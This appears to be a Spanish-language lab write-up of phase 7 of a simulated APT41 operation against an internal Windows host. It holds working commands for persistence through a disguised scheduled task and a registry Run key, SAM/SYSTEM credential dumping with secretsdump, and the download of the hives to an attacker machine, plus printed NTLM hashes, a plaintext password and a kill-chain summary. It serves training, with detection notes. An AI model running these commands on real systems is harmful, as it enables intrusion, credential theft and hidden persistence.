# Persistence & Objective — Operación SILENT BRIDGE
## Fase 7 — Persistence + Objective Completion
**Operación:** SILENT BRIDGE | **Adversario:** APT41 | **Framework:** MITRE ATT&CK v14  
**Operador:** Adrián Camacho | **Fecha:** 15/05/2026  
**Objetivo:** Persistencia en PC-01 + credential dump + prueba de compromiso final

---

## FASE 7 — Persistence & Objective Completion

**Tácticas MITRE:** TA0003 — Persistence / TA0006 — Credential Access / TA0009 — Collection

---

### 7.1 — Persistence: Scheduled Task
**Técnica MITRE:** T1053.005 — Scheduled Task/Job: Scheduled Task  
> 📸 Captura: ![fase7-01](../screenshots/FASE-7-Persistence/fase7-01-persistence-established.png)

```powershell
# Crear tarea programada — se ejecuta en cada logon de thomas
schtasks /create /tn "WindowsUpdateHelper" \
  /tr "C:\Users\thomas\Documents\beacon_pc01_v2.exe" \
  /sc onlogon /ru thomas /f

# Verificar
schtasks /query /tn "WindowsUpdateHelper" /fo LIST
```

**Output:**
```
Correcto: se creó correctamente la tarea programada "WindowsUpdateHelper".

Carpeta: \
Nombre de host:           PC-01
Nombre de tarea:          \WindowsUpdateHelper
Estado:                   Listo
Modo de inicio de sesión: Solo interactivo
```

**Naming OPSEC:** `WindowsUpdateHelper` imita tareas legítimas del sistema Windows Update para reducir sospecha en revisiones manuales.

**Detección Blue Team:** Windows Event ID 4698 — scheduled task creada. Ruta `C:\Users\thomas\Documents\` es anómala para tareas legítimas del sistema.

---

### 7.2 — Persistence: Registry Run Key
**Técnica MITRE:** T1547.001 — Boot or Logon Autostart: Registry Run Keys  
> 📸 Captura: incluida en `fase7-01-persistence-established.png`

```powershell
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" \
  /v "WindowsHelper" \
  /t REG_SZ \
  /d "C:\Users\thomas\Documents\beacon_pc01_v2.exe" /f

# Verificar
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

Segunda capa de persistencia — si se elimina la scheduled task, el Run Key mantiene la ejecución automática en cada inicio de sesión.

---

### 7.3 — Credential Dumping — SAM + SYSTEM
**Técnica MITRE:** T1003.002 — OS Credential Dumping: Security Account Manager  
> 📸 Captura: ![fase7-02](../screenshots/FASE-7-Persistence/fase7-02-credential-dump.png)  
> 📸 Captura pedagógica: ![fase7-02b](../screenshots/FASE-7-Persistence/fase7-02b-sam-system-download.png)

```powershell
# Exportar SAM y SYSTEM desde Evil-WinRM
reg save HKLM\SAM C:\Users\thomas\Documents\sam.bak
reg save HKLM\SYSTEM C:\Users\thomas\Documents\system.bak

# Descargar a Kali
download sam.bak
download system.bak
```

```bash
# Extraer hashes en Kali
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

**Hashes NTLM obtenidos:**

```
[*] Target system bootKey: 0xe26c10891df0373cc21e68e1aac57ef3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8ab6ae88bcb644f4ed59bc0f35a0cdad:::
PC-01:1001:aad3b435b51404eeaad3b435b51404ee:b73fdfe10e87b4ca5c0d957f81de6863:::
thomas:1002:aad3b435b51404eeaad3b435b51404ee:e1168d5763d3da51868e0fefc70d18e8:::
```

| Usuario | RID | Hash NTLM | Notas |
|---------|-----|-----------|-------|
| Administrador | 500 | `31d6cfe0d16ae931b73c59d7e0c089c0` | Hash de contraseña vacía — cuenta deshabilitada |
| thomas | 1002 | `e1168d5763d3da51868e0fefc70d18e8` | ← hash operacional |
| PC-01 | 1001 | `b73fdfe10e87b4ca5c0d957f81de6863` | Cuenta de equipo |

**Nota técnica:** `reg save` utiliza la shadow copy del registro — permite exportar SAM y SYSTEM aunque estén bloqueados por el SO. Requiere privilegios de Administrador local. Técnica más silenciosa que acceder a LSASS directamente.

---

### 7.4 — Data Collection
**Técnica MITRE:** T1039 — Data from Network Shared Drive  
> 📸 Captura: ![fase7-03](../screenshots/FASE-7-Persistence/fase7-03-data-exfiltration.png)

```powershell
ls C:\Users\thomas\Documents\
```

```
Mode    LastWriteTime    Length  Name
----    -------------    ------  ----
-a----  5/15/2026 18:09  36873216  beacon_pc01.exe
-a----  5/15/2026 19:41  37059584  beacon_pc01_v2.exe
-a----  5/15/2026 20:14     65536  sam.bak
-a----  5/15/2026 20:14  11173888  system.bak
```

**Datos exfiltrados:**

| Fichero | Tamaño | Contenido |
|---------|--------|-----------|
| `sam.bak` | 65 KB | Hashes NTLM usuarios locales PC-01 |
| `system.bak` | 11 MB | Bootkey para descifrado del SAM |

---

### 7.5 — Objective Proof — Prueba de compromiso final
> 📸 Captura: ![fase7-04](../screenshots/FASE-7-Persistence/fase7-04-objective-proof.png)

```powershell
whoami    → pc-01\thomas
hostname  → PC-01
ipconfig  → 10.0.3.7/24 (LabInternal — red interna segmentada)
```

**PC-01 comprometido — red interna no accesible desde Internet.** ✅

---

## Resumen global — Operación SILENT BRIDGE

```
KILL CHAIN COMPLETA
════════════════════════════════════════════════════════════════

[Kali 10.0.2.9]
  │ Nmap → Webmin 1.890 → CVE-2019-12840 identificado
  ▼
[PROD 10.0.2.200] ← root shell (exploit Python CVE-2019-12840)  [F1-2] ✅
  │ Ligolo-ng agent → túnel TLS :11601
  ▼
[Kali proxy] ← ruta 10.0.3.0/24 activa                          [F3] ✅
  │ Git clone git://10.0.3.150/wreath-web
  │ git show 992ecff → thomas:iamthegreatest
  ▼
[GIT 10.0.3.150] ← credenciales extraídas                       [F4] ✅
  │ Evil-WinRM thomas:iamthegreatest
  ▼
[PC-01 10.0.3.7] ← shell Windows 11 Enterprise                  [F5] ✅
  │ Sliver beacon → PROD:443 (relay) → Kali:443
  ▼
[C2 SUDDEN_COMMUNICATION (dc797c42)]                             [F6] ✅
  │ schtasks WindowsUpdateHelper + reg Run Key
  │ reg save SAM/SYSTEM → secretsdump → hashes NTLM
  ▼
[OBJETIVO COMPLETADO]                                            [F7] ✅

CREDENCIALES OBTENIDAS:
  thomas          : iamthegreatest            ← git history
  thomas (NTLM)   : e1168d5763d3da51868e0fefc70d18e8
  PC-01  (NTLM)   : b73fdfe10e87b4ca5c0d957f81de6863

PERSISTENCIA ESTABLECIDA:
  Scheduled Task  : WindowsUpdateHelper (onlogon) ✅
  Registry Run Key: HKCU\...\Run\WindowsHelper ✅

TÉCNICAS MITRE — TOTAL OPERACIÓN:
  T1046, T1592.002, T1596         → Reconnaissance
  T1190                            → Initial Access (Webmin RCE)
  T1059.004, T1082, T1016         → Execution + Discovery (PROD)
  T1572, T1090, T1105             → Pivoting (Ligolo-ng)
  T1552.001, T1083                → Credential + File Discovery (GIT)
  T1078, T1021.006                → Lateral Movement (PC-01)
  T1562.001                        → Defense Evasion (Defender)
  T1587.001, T1204.002            → Implant deployment
  T1071.001, T1573.002            → C2 (Sliver HTTPS)
  T1053.005, T1547.001            → Persistence
  T1003.002                        → Credential Dumping (SAM)
  T1039                            → Data Collection
```

---

**Documentación siguiente:** [lessons_learned.md](lessons_learned.md) | [mitigations.md](mitigations.md)